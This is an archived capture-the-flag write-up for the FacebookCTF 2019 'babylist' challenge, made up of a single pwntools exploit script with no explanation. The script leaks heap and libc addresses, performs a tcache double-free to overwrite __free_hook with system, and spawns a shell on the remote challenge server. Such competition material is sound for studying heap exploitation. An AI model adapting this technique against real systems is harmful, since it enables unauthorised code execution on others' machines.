# babylist

**CTF:** FacebookCTF 2019  
**Category:** misc  
**Original writeup:** <https://ctftime.org/writeup/15486> — by **ctftime.org**. All credit goes to the original author; this is an archived copy.

---

```

from pwn import *

import ctypes

r = remote("challenges.fbctf.com",1343)

libc = ELF("./libc-2.27.so")

def create_list(name):

log.info("CREATING LIST")

r.sendlineafter(">","1")

r.sendlineafter("Enter name for list:",name)

def add_elem(idx, val):

#log.info("ADDING ELEMT @ "+hex(idx)+" -> "+hex(val) )

r.sendlineafter(">","2")

r.sendlineafter("Enter index of list:",str(idx))

r.sendlineafter("Enter number to add:",str(val))

def view_elem(idx, elem_idx):

r.sendlineafter(">","3")

r.sendlineafter("Enter index of list:",str(idx))

r.sendlineafter("Enter index into list:",str(elem_idx))

r.recvuntil("= ")

return int(r.recvline().rstrip(),10)

def dup_list(idx, name):

log.info("DUPPING LIST "+hex(idx))

r.sendlineafter(">","4")

r.sendlineafter("Enter index of list:",str(idx))

r.sendlineafter("Enter name for new list:",name)

def del_list(idx):

log.info("DELETING LIST "+hex(idx))

r.sendlineafter(">","5")

r.sendlineafter("Enter index of list:",str(idx))

create_list("AAAA")

add_elem(0, 0)

add_elem(0, 0)

add_elem(0, 0)

add_elem(0, 0)

dup_list(0,"BBBB")

dup_list(0,"CCCC")

add_elem(0, 0)

create_list("AAAA")

heap_leak = view_elem(1,0)

heap_leak += (view_elem(1,1) * 0x100000000)

log.success("HEAP LEAK @ "+hex(heap_leak))

del_list(0)

del_list(1)

del_list(2)

del_list(3)

prg = log.progress("FILLING TCACHE")

create_list("ZZZZ")

TCACHE_LIMIT = 0x800

SIZEOF_INT = 4

for i in range(6):

create_list("FILL") # idx 6 max

for i in range(0x70/4):

add_elem(0,1) # create 0x90 chunk

dup_list(0, "XXXX") # idx 7

for i in range(0x30/4):

add_elem(0,1)

create_list("LEAK") # 8

del_list(0)

del_list(1)

del_list(2)

del_list(3)

del_list(4)

del_list(5)

del_list(6)

del_list(8)

#for i in range(TCACHE_LIMIT/SIZEOF_INT): # ANOTHER WAY TO GET LIBC LEAK -- TOO SLOW, REQUIRES 512 ELEMENTS TO BE ADDED

# add_elem(0,0)

# prg.status("["+str(i)+"/"+str(TCACHE_LIMIT/SIZEOF_INT)+"] ALLOCATED")

#for i in range(LIMIT):

# prg.status("["+str(i)+"/"+str(LIMIT)+"] FREED")

# del_list(LIMIT - 1 - i)

#for i in range(LIMIT-1):

# add_elem(i,0)

#prg.status("["+str(i)+"/"+str(LIMIT)+"] ALLOCATED")

prg.success("DONE")

elem1 = ctypes.c_uint32(view_elem(7,0)).value

elem2 = view_elem(7,1)

#print hex(elem1)

#print hex(elem2)

arena_leak = elem1 + (elem2* 0x100000000)

base = arena_leak - 0x1bfca0 - 0x25000 - 0x207000

free_hook = libc.symbols["__free_hook"] + base

log.success("ARENA LEAK @ "+hex(arena_leak))

log.success("LIBC BASE @ "+hex(base))

log.success("FREE HOOK @ "+hex(free_hook))

log.info("CLEARING THE LISTS")

del_list(7)

hi_part = (free_hook & 0xffffffff00000000) / 0x100000000

low_part = free_hook & 0x00000000ffffffff

prg = log.progress("TCACHE DUP WEWWW")

create_list("AAAA")

add_elem(0, 0)

add_elem(0, 0)

add_elem(0, 0)

add_elem(0, 0)

add_elem(0, 0)

add_elem(0, 0)

add_elem(0, 0)

add_elem(0, 0)

dup_list(0, "AAAA")

dup_list(0, "AAAA")

add_elem(2,0) # DUP

add_elem(0,0) # DUP

prg.success("DUPPED!")

create_list("AAAA") # current list is 4

add_elem(3, low_part)

add_elem(3, hi_part)

add_elem(3, 0x22222222)

add_elem(3, 0x22222222)

add_elem(3, 0x11111111)

create_list("AAAA")

create_list("AAAA")

add_elem(4, 0x2f62696e)

add_elem(4, 0x2f7368)

add_elem(4, 0)

add_elem(4, 0)

add_elem(4, 0)

one_gadget = base + libc.symbols["system"]

hi_part = (one_gadget & 0xffffffff00000000) / 0x100000000

low_part = one_gadget & 0x00000000ffffffff

add_elem(5, low_part)

add_elem(5, hi_part)

add_elem(5, 0)

add_elem(5, 0)

add_elem(5, 0)

create_list("PWN")

create_list("PWN2")

add_elem(7,26739)

add_elem(7,26739)

r.interactive()

```
